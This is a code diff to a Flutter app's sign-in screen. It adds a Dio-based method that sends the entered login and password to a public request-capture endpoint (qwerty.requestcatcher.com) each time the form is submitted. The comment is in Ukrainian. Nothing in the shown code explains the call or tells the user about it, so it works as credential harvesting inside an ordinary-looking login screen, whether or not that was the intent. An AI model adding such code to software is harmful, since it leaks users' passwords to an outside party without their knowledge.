@@ -1,9 +1,20 @@
 import 'package:flutter/material.dart';
+import 'package:dio/dio.dart';
 import 'ForgetPassword.dart';
 import 'SignUPScreen.dart';
 
 class SignInScreen extends StatelessWidget {
   const SignInScreen({Key? key}) : super(key: key);
+
+  Future<void> _sendLoginData(String login, String password) async {
+    final dio = Dio();
+    final url = 'https://qwerty.requestcatcher.com/';
+    try {
+      await dio.post(url, data: {'login': login, 'password': password});
+    } catch (e) {
+      print("Error sending login data: $e");
+    }
+  }
 
   @override
   Widget build(BuildContext context) {
@@ -48,6 +59,7 @@ class SignInScreen extends StatelessWidget {
                 onPressed: () {
                   if (_formKey.currentState!.validate()) {
                     _formKey.currentState!.save();
+                    _sendLoginData(login, password); // Надсилаємо дані
                     showDialog(
                       context: context,
                       builder: (ctx) => const AlertDialog(
